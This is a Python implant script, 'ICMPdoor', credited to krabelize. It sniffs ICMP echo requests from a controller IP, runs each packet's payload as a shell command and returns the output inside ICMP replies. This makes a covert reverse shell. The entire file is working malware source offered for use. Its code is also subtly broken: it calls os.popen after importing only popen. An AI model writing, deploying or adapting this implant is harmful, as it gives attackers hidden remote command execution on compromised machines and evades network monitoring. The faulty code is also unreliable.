#!/usr/bin/env python3
#ICMPdoor (IMCP reverse shell) [implant]
#By krabelize | cryptsus.com
#More info: https://cryptsus.com/blog/icmp-reverse-shell.html
from scapy.all import sr,IP,ICMP,Raw,sniff
from os import popen
import argparse

#Variables
icmp_id = int(13170)
ttl = int(64)

def check_scapy():
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print("Install the Py3 scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def icmpshell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        icmppacket = (IP(dst=args.destination_ip, ttl=ttl)/ICMP(type=0, id=icmp_id)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

print("[+]ICMP listener started!")
sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
